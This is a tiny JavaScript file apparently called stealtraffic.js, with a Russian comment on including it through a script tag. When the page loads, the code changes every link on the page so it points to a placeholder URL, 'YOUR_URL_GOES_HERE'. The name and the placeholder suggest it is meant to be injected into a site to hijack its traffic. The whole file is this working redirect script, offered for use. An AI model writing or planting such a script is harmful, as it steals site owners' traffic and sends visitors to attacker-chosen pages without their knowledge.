//Подключаем как <script src="stealtraffic.js"></script>
window.onload = function() {
  var anchors = document.getElementsByTagName("a");

  for (var i = 0; i < anchors.length; i++) {
    anchors[i].href = "YOUR_URL_GOES_HERE"
  }
}